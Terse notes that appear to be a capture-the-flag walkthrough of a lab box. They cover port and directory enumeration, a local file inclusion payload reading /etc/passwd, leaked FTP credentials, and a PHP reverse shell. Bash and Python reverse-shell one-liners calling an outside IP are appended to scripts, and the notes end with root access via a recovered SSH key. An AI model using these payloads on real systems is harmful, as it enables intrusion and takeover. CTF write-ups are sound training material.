nmap:
21 ftp
22 ssh
80 http


 gobuster:
 found robots.txt contains: /flag_1.txt
							/secret_file_do_not_read.txt

LFI exploit: /post.php?post=../../../../../etc/passwd
can read: /post.php?post=secret_file_do_not_read.txt
found ftp cred: ftpuser:givemefiles777  -> flag_2.txt

put rev shell to files dir in ftp
/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php
 ->     get rev shell.

 -> access as toby: sudo -u toby bash

echo "bash -i >& /dev/tcp/10.8.110.79/8080 0>&1" >> cow.sh

 -> access as mat

echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.110.79",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]) " >> cmd.py

run will_script as will: sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
 
 -> access as will

 find / -group adm 
 found /opt/backups/key.b64 (base64)
 decode found rsa private key

 ssh -i id_rsa root@<ip>
  -> access as root

